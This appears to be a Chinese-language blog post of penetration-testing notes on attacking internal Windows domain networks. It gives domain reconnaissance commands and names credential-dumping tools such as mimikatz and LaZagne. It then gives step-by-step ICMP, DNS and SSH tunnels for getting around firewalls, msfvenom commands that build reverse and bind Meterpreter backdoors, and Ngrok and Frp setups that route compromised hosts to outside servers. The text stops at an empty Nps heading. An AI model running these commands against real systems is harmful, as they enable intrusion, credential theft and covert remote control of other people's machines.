



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="X_T" href="http://www.n1h1l157.live/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="X_T" href="http://www.n1h1l157.live/atom.xml" />
<link rel="alternate" type="application/json" title="X_T" href="http://www.n1h1l157.live/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="渗透测试" />


<link rel="canonical" href="http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">



  <title>
XD22 11 内网安全 - 信息安全 |
Phut Hon = X_T = 天行健，君子以自强不息</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">XD22 11 内网安全
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-12-30 00:00:00">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-12-30T00:00:00+08:00">2022-12-30</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>34k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>57 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/zqTVIhAkrmZgoSj.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/S4bepoyLPicVCx5.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/GgPFMtEz5HwZ2mJ.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/N9BJsPE7YgiVhTM.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VHIxW2qc1oAMOef.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/vGCLbdJPMhuwg3H.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content=".N1h1l157">
    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="X_T">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>局域网：小型办公室，家里<br>
工作组：学校机房，网吧<br>
内网域：大型机器组成的内网，域控即主控制器可以管理电脑，负责下发任务和统一管理，对所有的机器进行软件安装、环境部署</p>
<p>域用户 whoami 会显示 DC 名字而不是主机名，此时去下载软件受限于域控，如果域控未开通域成员下载软件的功能，则域成员下载软件时需要征得域控的同意。此时如果切换为普通用户，即 whoami 显示主机名时可以下载软件，将不受域控的管理限制。</p>
<h3 id="域信息收集"><a class="markdownIt-Anchor" href="#域信息收集">#</a> 域信息收集</h3>
<ul>
<li>一些注意事项</li>
</ul>
<p>（ 1 ）linux 可以成为一个域成员主机，在域内环境并不常见。</p>
<p>（ 2 ）域内有 DNS 服务器做解析，由域控分配解析规则，不允许在互联网解析。</p>
<p>（ 3 ）判断是否在域内<br>
 <code>net view /domain</code>  判断存在域<br>
 <code>net time /domain</code>  判断主域</p>
<p>（ 4 ）获取域控 ip<br>
 <code>net time /domain</code>  获取域控时间，ping 此命令返回的域控名得到域控 ip</p>
<h4 id="应用-服务-权限收集"><a class="markdownIt-Anchor" href="#应用-服务-权限收集">#</a> 应用 服务 权限收集</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line">netstat -ano 端口列表</span><br><span class="line">route print 路由表</span><br><span class="line">net start 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br><span class="line">ipconfig /all 判断存在域</span><br><span class="line">netstat -ano 当前网络端口开放</span><br><span class="line">nslookup 域名 追踪来源地址</span><br><span class="line">wmic service list brief 查询本机服务</span><br><span class="line">net config workstation 查询当前登录域及登录用户信息</span><br><span class="line">wmic startup get command,caption 查看已启动的程序信息</span><br></pre></td></tr></table></figure>
<h4 id="网络-用户-域控收集"><a class="markdownIt-Anchor" href="#网络-用户-域控收集">#</a> 网络 用户 域控收集</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net view /domain 查询域列表</span><br><span class="line">net time /domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器</span><br><span class="line">net localgroup administrators 本机管理员【通常含有域用户】</span><br><span class="line">net user /domain 查询域用户(当前域)</span><br><span class="line">net group /domain 查询域工作组</span><br><span class="line">net group &quot;domain computers&quot; /domain 查看加入域的所有计算机名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查询域管理员用户组和域管用户</span><br><span class="line">net localgroup administrators /domain 查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain 查看域控</span><br><span class="line">net accounts /domain 查看域密码策略</span><br></pre></td></tr></table></figure>
<h4 id="密码-凭据-口令收集"><a class="markdownIt-Anchor" href="#密码-凭据-口令收集">#</a> 密码 凭据 口令收集</h4>
<p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>
计算机用户 HASH，明文获取 - mimikatz (win)，mimipenguin (linux)<br>
 计算机各种协议服务口令获取 - LaZagne (all)，XenArmor (win)，CS 插件</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHov">https://github.com/gentilkiwi/mimikatz/</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmUv">https://github.com/AlessandroZ/LaZagne/</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9taW1pcGVuZ3Vpbg==">https://github.com/huntergregal/mimipenguin</span><br>
<span class="exturl" data-url="aHR0cHM6Ly94ZW5hcm1vci5jb20vYWxsaW5vbmUtcGFzc3dvcmQtcmVjb3ZlcnktcHJvLXNvZnR3YXJlLw==">https://xenarmor.com/allinone-password-recovery-pro-software/</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">（ 1 ）站点源码备份文件、数据库备份文件等</span><br><span class="line">（ 2 ）各类数据库Web管理入口，如PHPMyAdmin</span><br><span class="line">（ 3 ）浏览器保存密码、浏览器Cookies</span><br><span class="line">（ 5 ）其他用户会话、 3389 和ipc$连接记录、回收站内容</span><br><span class="line">（ 6 ）Windows 保存的WIFI密码</span><br><span class="line">（ 7 ）网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等</span><br><span class="line">````</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">### 自动化工具探针</span></span></span><br><span class="line"></span><br><span class="line">工具只是辅助，实际过程中涉及到的问题繁多，需要配合手动解决各种问题。</span><br><span class="line"></span><br><span class="line">https://github.com/k8gege/LadonGo</span><br><span class="line">https://github.com/BloodHoundAD/BloodHound</span><br><span class="line">http://www.joeware.net/freetools/tools/adfind/index.htm</span><br><span class="line"></span><br><span class="line">CS插件：LSTAR Ladon OLa TaoWu等</span><br><span class="line"></span><br><span class="line">- Adfind</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">列出域控制器名称：AdFind -sc dclist</span><br><span class="line">查询当前域中在线的计算机：AdFind -sc computers_active</span><br><span class="line">查询当前域中在线的计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -sc computers_active name operatingSystem</span><br><span class="line">查询当前域中所有计算机：AdFind -f &quot;objectcategory=computer&quot;</span><br><span class="line">查询当前域中所有计算机(只显示名称和操作系统)：</span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br><span class="line">查询域内所有用户：AdFind -users name</span><br><span class="line">查询所有GPO：AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>
<ul>
<li>BloodHound 域分析使用</li>
</ul>
<p><span class="exturl" data-url="aHR0cDovL2NuLXNlYy5jb20vYXJjaGl2ZXMvMTQ2NTQ4Lmh0bWw=">http://cn-sec.com/archives/146548.html</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k">https://github.com/BloodHoundAD/BloodHound</span></p>
<p>攻击机启动 neo4j 数据库 neo4j.bat console、内网启动 BloodHound 收集信息 SharpHound.exe -c all 生成 zip 文件、运行 BloodHound.exe 后将生成数据导入，筛选查看。</p>
<h3 id="隧道技术"><a class="markdownIt-Anchor" href="#隧道技术">#</a> 隧道技术</h3>
<h4 id="隧道基础理论"><a class="markdownIt-Anchor" href="#隧道基础理论">#</a> 隧道基础理论</h4>
<ul>
<li>相关名词解释</li>
</ul>
<p>隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）<br>
代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）<br>
域控防火墙更新策略：域控通过强制按钮或域内用户用 gpupdate/force 更新域控防火墙设置</p>
<ul>
<li>域控防火墙 - 组策略不出网上线</li>
</ul>
<p>域控通过组策略设置防火墙规则同步后，域内用户主机被限制 TCP 出网，其中规则为出站规则，安全研究者通过入站取得 SHELL 权限，需要对其进行上线控制。可利用正向连接或者隧道技术来实现。</p>
<p>tcp 转 ICMP 协议出网在返回 tcp 协议项目：<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9zcHA=">https://github.com/esrrhs/spp</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JkYW1lbGUvaWNtcHNo">https://github.com/bdamele/icmpsh</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9waW5ndHVubmVs">https://github.com/esrrhs/pingtunnel</span></p>
<ul>
<li>使用出网协议建立隧道</li>
</ul>
<p>SMB 隧道： 445 通讯、借助通讯后绑定上线、直接 SMB 协议通讯即可<br>
 ICMP 隧道：ping 命令、借助项目 (icmpsh icmptunnel pingtunnel) 通讯<br>
 DNS 隧道：nslookup dig、内网主机只出网 DNS 协议数据，<br>
SSH 隧道：由于 cs 无 SSH 协议监听器配置，无法上线</p>
<p>域名申请及配置 ns 解析记录、监听器创建选择 DNS 解析及其地址、后门绑定监听器，肉鸡执行 DNS 设置的木马上线主机，是一个 unknown 的主机，输入相关命令后成功上线。</p>
<h4 id="icmp-隧道"><a class="markdownIt-Anchor" href="#icmp-隧道">#</a> icmp 隧道</h4>
<ul>
<li>cs 控制 tcp 被禁用的域内主机</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">跳板机开启隧道</span></span><br><span class="line">./pingtunnel -type server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">肉鸡(管理器运行)</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t 192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS监听器</span></span><br><span class="line">127.0.0.1 6666 192.168.46.66 7777</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成第一个监听器的Stager后门肉鸡执行后上线第二个监听器的马肉鸡将流经本地tcp流量的 6666 端口以icmp流量的方式转发至跳板机的 7777 端口，并且不输出任何日志，跳板机负责接收此流量。cs 的木马监听器从跳板机的 7777 端口处获取到肉鸡的反弹shell。</span></span><br></pre></td></tr></table></figure>
<ul>
<li>msf 控制 tcp 被禁用的域内主机</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成后门</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 - f exe &gt; xd.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF启动监听</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kali开启隧道</span></span><br><span class="line">./pingtunnel -type server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Win 开启隧道(管理员运行)</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3333 -s 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
<h4 id="dns-隧道"><a class="markdownIt-Anchor" href="#dns-隧道">#</a> dns 隧道</h4>
<p>（ 1 ）前提条件<br>
使用场景：内网主机只出网 DNS 协议数据<br>
项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lhcnJpY2svaW9kaW5l">https://github.com/yarrick/iodine</span><br>
 判断出网：nslookup <span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20=">http://www.baidu.com</span></p>
<p>（ 2 ）设置方法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器：设置密码xiaodi并创建虚拟IP及绑定域名指向</span></span><br><span class="line">iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端：连接密码xiaodi并绑定域名指向</span></span><br><span class="line">iodine -f -M 200 -P xiaodi ns1.xiaodi8.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试通讯尝试连接：</span></span><br><span class="line">ssh root@192.168.0.2</span><br></pre></td></tr></table></figure>
<p>（ 3 ）结果<br>
会在外网主机上建立一块名为 192.168.0.1 的网卡，并且密码是 xiaodi。在内网主机上有一块 192.168.0.2 的 ip 地址，可以让外网直接访问。即外网通过新生成的 DNS 隧道访问到内网机器，一般用来控制 linux 的 ssh，在 windows 上使用时需安装 openvpn。</p>
<h4 id="ssh-隧道"><a class="markdownIt-Anchor" href="#ssh-隧道">#</a> ssh 隧道</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启ssh协议登录</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地 8080 流量转发至跳板机 1122 ，解决出站规则限制问题</span></span><br><span class="line">ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166</span><br><span class="line">curl http://127.0.0.1:1122</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地 8080 流量转发至跳板机 1234 ，解决入站规则限制问题</span></span><br><span class="line">ssh -CfNg -R 1234:192.168.1.15:8080 root@47.94.236.117</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>
<h3 id="代理技术"><a class="markdownIt-Anchor" href="#代理技术">#</a> 代理技术</h3>
<h4 id="跳板机间接控制"><a class="markdownIt-Anchor" href="#跳板机间接控制">#</a> 跳板机间接控制</h4>
<p>控制跳板机后，右键设置代理端口<br>
命令：socks 59578<br>
 操作：通过 profixier 设置代理服务器及代理规则后可以访问刀内网资产</p>
<h4 id="msf-正向控制"><a class="markdownIt-Anchor" href="#msf-正向控制">#</a> msf 正向控制</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成后门</span></span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe &gt; bd.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">让不出网的机器去执行这个正向连接的后门:</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.11.129</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="cs-正向控制"><a class="markdownIt-Anchor" href="#cs-正向控制">#</a> cs 正向控制</h4>
<p>CS 控制上线 - 正向连接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听器设置正向连接</span></span><br><span class="line">bind_tcp port</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成监听器为正向连接的后门供不出网肉鸡执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开会话交互连接不出网主机正向连接的shell</span></span><br><span class="line">connect ip port</span><br></pre></td></tr></table></figure>
<h4 id="不出网机器上线"><a class="markdownIt-Anchor" href="#不出网机器上线">#</a> 不出网机器上线</h4>
<p><img data-src="/N1h1l157/Safe/image-001.png" alt></p>
<ul>
<li>windows 2008 机器的控制</li>
</ul>
<p>在控制 windows 10 的基础上，此时已经用 cs 上线此机器。通过 windows 2008 做反向连接到 windows 10 上，并在 window 10 上做端口转发。右键 windows 选择转发上线，生成木马，供 2008 执行获取其权限。</p>
<ul>
<li>windows 2012 机器的控制</li>
</ul>
<p>如果采用正向连接，因为其本身采用了入站限制，无法突破。<br>
如果采用反向连接，因为 windows 2008 采用了入站限制，仍无法突破。</p>
<p>如果用 pingtunnel 将 tcp 流量转为 icmp 出 windows 2012 ，无法突破 windows 2008 的入站。因为到了 windows 2008 处时流量变成了 tcp，仍被限制。<br>
因为开了打印机服务，可以通过 smb 即文件共享协议来进行上线。</p>
<p>创建 smb 的监听器，防火墙允许 smb 就可以借助 smb 管道，配合 smb 的横向移动利用，psexec 64 进行操作，前提是获取到其账户密码。</p>
<ul>
<li>防火墙限制绕过</li>
</ul>
<p>入站过滤上线：隧道技术正向硬刚、反向连接跳过、防火墙开关，删除规则，替换程序。<br>
出站过滤上线：隧道技术反向硬刚、正向连接跳过、防火墙开关，删除规则，替换程序。<br>
两者都有：smb 是否开启，进行 smb 隧道上线</p>
<p>实际环境中两种方法都测试判断是入站还是出站限制或者两者都有<br>
第三种方案：单纯的内网环境、单纯的内网域环境（域控没有设置组策略防火墙同步）</p>
<h3 id="内网穿透上线"><a class="markdownIt-Anchor" href="#内网穿透上线">#</a> 内网穿透上线</h3>
<ul>
<li>穿透的作用</li>
</ul>
<p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构<br>
（ 1 ）流量代理工具：Proxychains Proxifier<br>
（ 2 ）穿透项目：Ngrok Frp Spp Nps</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubmdyb2suY2M=">https://www.ngrok.cc</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9zcHA=">https://github.com/esrrhs/spp</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==">https://github.com/fatedier/frp</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VoYW5nLWlvL25wcw==">https://github.com/ehang-io/nps</span></p>
<h4 id="ngrok-上线内网机器"><a class="markdownIt-Anchor" href="#ngrok-上线内网机器">#</a> Ngrok 上线内网机器</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端配置：开通隧道-TCP协议-指向IP和端口-开通隧道-连接隧道</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端连接服务端</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端连接 Ngrok 的服务器</span></span><br><span class="line">./sunny clientid 133328291918</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端生成后门配置监听</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=free.idcfengye.com lport=10134 -f exe -o tcp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="frp上线内网机器"><a class="markdownIt-Anchor" href="#frp上线内网机器">#</a> Frp 上线内网机器</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器修改配置文件frps.ini：</span></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务端：</span></span><br><span class="line">./frps -c ./frps.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端修改配置文件frpc.ini：</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.94.236.117</span><br><span class="line">server_port = 7000 #frpc工作端口，必须和上面frps保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555 #转发给本机的 5555</span><br><span class="line">remote_port = 6000 #服务端用 6000 端口转发给本机</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动客户端：</span> </span><br><span class="line">./frpc -c ./frpc.ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf生成木马并监听</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6000 - f exe -o frp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<h4 id="nps上线内网机器"><a class="markdownIt-Anchor" href="#nps上线内网机器">#</a> Nps 上线内网机器</h4>
